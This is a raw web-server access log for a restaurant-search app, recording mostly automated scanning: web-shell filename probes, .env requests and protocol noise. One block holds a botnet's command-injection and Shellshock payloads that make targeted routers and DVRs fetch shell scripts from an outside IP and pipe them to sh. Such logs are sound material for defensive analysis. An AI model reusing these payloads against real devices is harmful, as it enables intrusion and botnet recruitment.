20.18.121.38 - - [07/Oct/2025:10:58:04 +0000] "GET /520.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:04 +0000] "GET /file2.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:04 +0000] "GET /w.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:04 +0000] "GET /ee.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:04 +0000] "GET /an.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:04 +0000] "GET /wp.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:05 +0000] "GET /makeasmtp.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:05 +0000] "GET /system_log.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:05 +0000] "GET /NewFile.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:05 +0000] "GET /r.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:05 +0000] "GET /v4.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:05 +0000] "GET /lock360.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:05 +0000] "GET /build.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:06 +0000] "GET /inde.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:06 +0000] "GET /atomlib.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:06 +0000] "GET /ffile.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:06 +0000] "GET /0x0x.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:06 +0000] "GET /sec.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:06 +0000] "GET /ssss.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:07 +0000] "GET /anskrit.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:07 +0000] "GET /thh.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:07 +0000] "GET /he.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:07 +0000] "GET /ddgg.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:07 +0000] "GET /aves.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:07 +0000] "GET /pp.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:07 +0000] "GET /geck.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:08 +0000] "GET /plss3.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:08 +0000] "GET /ton.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:08 +0000] "GET /ahax.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:08 +0000] "GET /ar.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:08 +0000] "GET /xx.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:08 +0000] "GET /wp-gr.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:09 +0000] "GET /yellow.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:09 +0000] "GET /a1.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:09 +0000] "GET /zwso.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:09 +0000] "GET /alfa.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:09 +0000] "GET /epinyins.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:09 +0000] "GET /x.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:09 +0000] "GET /lv.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:10 +0000] "GET /fffff.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:10 +0000] "GET /file1.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:10 +0000] "GET /keu.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:10 +0000] "GET /file88.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:10 +0000] "GET /cccc.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:10 +0000] "GET /hexx.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:11 +0000] "GET /a2.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:11 +0000] "GET /cfile.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:11 +0000] "GET /jmfi2.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:11 +0000] "GET /file7.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:11 +0000] "GET /file4.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:11 +0000] "GET /manager.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:11 +0000] "GET /abcd.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:12 +0000] "GET /efile.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:12 +0000] "GET /file18.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:12 +0000] "GET /filesss.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:12 +0000] "GET /tox.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:12 +0000] "GET /2clas.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:12 +0000] "GET /vee.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:13 +0000] "GET /ff2.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:13 +0000] "GET /rrr.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:13 +0000] "GET /alpa.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:13 +0000] "GET /aa21.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:13 +0000] "GET /default.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:13 +0000] "GET /fileas.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:14 +0000] "GET /t.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:14 +0000] "GET /c.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:14 +0000] "GET /wpc.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:14 +0000] "GET /aa.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:14 +0000] "GET /usep.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:14 +0000] "GET /cool.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:14 +0000] "GET /lol.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:15 +0000] "GET /radio.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:15 +0000] "GET /ilex.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:15 +0000] "GET /klex.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:15 +0000] "GET /blex.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:15 +0000] "GET /mlex.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:15 +0000] "GET /nfile.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:16 +0000] "GET /class19.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:16 +0000] "GET /resp.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:16 +0000] "GET /vanta.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:16 +0000] "GET /fass.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:16 +0000] "GET /huangs.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:16 +0000] "GET /anan.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:16 +0000] "GET /classgoto24.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:17 +0000] "GET /hook.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:17 +0000] "GET /simp.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:17 +0000] "GET /ckk.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:17 +0000] "GET /tiny.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:17 +0000] "GET /wa.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:17 +0000] "GET /wb.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:18 +0000] "GET /wc.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:18 +0000] "GET /wd.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:18 +0000] "GET /we.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:18 +0000] "GET /wf.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:18 +0000] "GET /wg.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:18 +0000] "GET /wh.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:18 +0000] "GET /wi.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:19 +0000] "GET /wj.php HTTP/1.1" 200 400 "-" "-" "-"
20.18.121.38 - - [07/Oct/2025:10:58:19 +0000] "GET /wk.php HTTP/1.1" 200 400 "-" "-" "-"
170.106.75.142 - - [07/Oct/2025:11:04:38 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
87.121.84.17 - - [07/Oct/2025:11:09:01 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
173.211.8.146 - - [07/Oct/2025:11:53:53 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
173.211.8.146 - - [07/Oct/2025:11:53:54 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
204.76.203.219 - - [07/Oct/2025:12:27:44 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
20.169.104.203 - - [07/Oct/2025:12:52:05 +0000] "MGLNDD_3.149.120.21_80" 400 150 "-" "-" "-"
40.124.174.247 - - [07/Oct/2025:12:58:34 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.121.84.17 - - [07/Oct/2025:13:09:22 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
185.226.197.73 - - [07/Oct/2025:13:34:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
93.174.93.12 - - [07/Oct/2025:13:48:43 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36" "-"
43.153.62.161 - - [07/Oct/2025:13:48:49 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
31.58.18.226 - - [07/Oct/2025:14:24:00 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
31.58.18.226 - - [07/Oct/2025:14:24:01 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
204.76.203.219 - - [07/Oct/2025:14:36:36 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
196.251.70.234 - - [07/Oct/2025:14:44:25 +0000] "\x05\x02\x00\x02" 400 150 "-" "-" "-"
45.88.186.85 - - [07/Oct/2025:14:46:42 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:42 +0000] "GET /goform/webRead/open/?path=%7Cwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.wtf.sh%7Csh HTTP/1.0" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:42 +0000] "POST /apply_sec.cgi HTTP/1.1" 499 0 "http://3.149.120.21/login_pic.asp" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:42 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - ffadmin [07/Oct/2025:14:46:43 +0000] "POST /apply.cgi HTTP/1.1" 499 0 "http://3.149.120.21/apply.cgi" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - ffadmin [07/Oct/2025:14:46:43 +0000] "POST /apply.cgi HTTP/1.1" 499 0 "http://3.149.120.21/apply.cgi" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - root [07/Oct/2025:14:46:43 +0000] "POST /dvr/cmd HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "GET / HTTP/1.1" 499 0 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\x22& #Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - admin [07/Oct/2025:14:46:43 +0000] "POST /goform/SystemCommand HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "GET /cgi-bin/shortcut_telnet.cgi?wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.wyu.sh%7Csh%26 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - admin [07/Oct/2025:14:46:43 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.ush.sh%7Csh%26&curpath=%2F&currentsetting.htm=1 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - admin [07/Oct/2025:14:46:43 +0000] "POST /cgi-bin/cgi_main.cgi HTTP/1.1" 499 0 "http://3.149.120.21/cfg_system_time.htm" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - admin [07/Oct/2025:14:46:43 +0000] "POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4= HTTP/1.1" 499 0 "http://3.149.120.21/cgi-bin/server/server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - admin [07/Oct/2025:14:46:43 +0000] "POST /goform/mp HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "POST /cgi-bin/system_mgr.cgi? HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.djc.sh%7Csh%3B%27 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "POST /goform/Mail_Test HTTP/1.0" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "GET /cgi-bin/;wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh|sh&echo${IFS} HTTP/1.0" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "GET /HNAP1/ HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.ebj.sh%7Csh%26echo%20 HTTP/1.0" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "GET /setup.cgi?todo=funjsq_login&funjsq_access_token=12345|busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.fep.sh%7Csh%0A&test=11%00currentsetting.htm HTTP/1.1" 499 0 "-" "Mozilla/5.0 (bang2012@tutanota.de)" "-"
45.88.186.85 - - [07/Oct/2025:14:46:43 +0000] "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
194.110.115.13 - - [07/Oct/2025:14:51:40 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; Scanner/1.0)" "-"
194.110.115.13 - - [07/Oct/2025:14:51:40 +0000] "GET /.env.production HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; Scanner/1.0)" "-"
34.77.161.183 - - [07/Oct/2025:14:59:03 +0000] "GET / HTTP/1.1" 400 154 "-" "python-requests/2.32.5" "-"
87.121.84.17 - - [07/Oct/2025:15:01:30 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
24.187.126.166 - - [07/Oct/2025:15:14:31 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1" "-"
24.187.126.166 - - [07/Oct/2025:15:14:31 +0000] "GET /assets/index-Bo8_gSxg.css HTTP/1.1" 200 2408 "http://safeeats-app-env.eba-nknmey2d.us-east-2.elasticbeanstalk.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1" "-"
24.187.126.166 - - [07/Oct/2025:15:14:31 +0000] "GET /assets/index-CkNa97w_.js HTTP/1.1" 200 196495 "http://safeeats-app-env.eba-nknmey2d.us-east-2.elasticbeanstalk.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1" "-"
24.187.126.166 - - [07/Oct/2025:15:14:36 +0000] "GET /api/restaurants/search/?q=Dunkin HTTP/1.1" 200 5276 "http://safeeats-app-env.eba-nknmey2d.us-east-2.elasticbeanstalk.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1" "-"
71.6.134.232 - - [07/Oct/2025:15:40:44 +0000] "\x16\x03\x01\x00\xEC\x01\x00\x00\xE8\x03\x03\xB8U\xDEy\x98I\x1FE\xE0\xFF\x17*q\x1F\xA5\x93\xE5\xAF\xB1\x0F\xFC\x84\xC0\xA8\x05\x1BUkS\xAFo\xFB \xA6\xBB,\xCC}\xEE\xC1CM\x84\xA4\x9B\xF4\xCC\x17\xA7\xE1\xA0\xA5\xB9u\xAA\xC3\xEC|7\xA6/L\xF5\xD92\x00 \x8A\x8A\x13\x01\x13\x02\x13\x03\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x01\x00\x00\x7F\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00" 400 150 "-" "-" "-"
43.159.145.149 - - [07/Oct/2025:15:48:07 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
3.132.23.201 - - [07/Oct/2025:15:48:16 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.132.23.201 - - [07/Oct/2025:15:50:15 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.132.23.201 - - [07/Oct/2025:15:54:09 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC4\xC0$\xFCE\x22\x04*K081\x01k('\xC5z)\xD1\xDFf\xAD\xEB\x1Cq\xFB\x08\xD9\x1E4\xCB\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
3.132.23.201 - - [07/Oct/2025:15:54:18 +0000] "" 400 0 "-" "-" "-"
138.68.154.198 - - [07/Oct/2025:15:55:05 +0000] "\x00\x0E8\xBD\xAC\xCB^\x08\xD37N\x00\x00\x00\x00\x00" 400 150 "-" "-" "-"
3.132.23.201 - - [07/Oct/2025:15:55:26 +0000] "SSH-2.0-Go" 400 150 "-" "-" "-"
3.132.23.201 - - [07/Oct/2025:15:56:31 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03c\xB5W\xFE\xFFf6\xF1\xBB$p\xE9\x8D\xC6\x1A\xB2\x97\xC7\xEC<(\x9DQ\xE5\xAD~gX-'\x039\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
71.6.134.232 - - [07/Oct/2025:15:56:50 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "-"
87.121.84.17 - - [07/Oct/2025:16:13:40 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
59.152.61.190 - - [07/Oct/2025:16:35:51 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
59.152.61.190 - - [07/Oct/2025:16:35:52 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
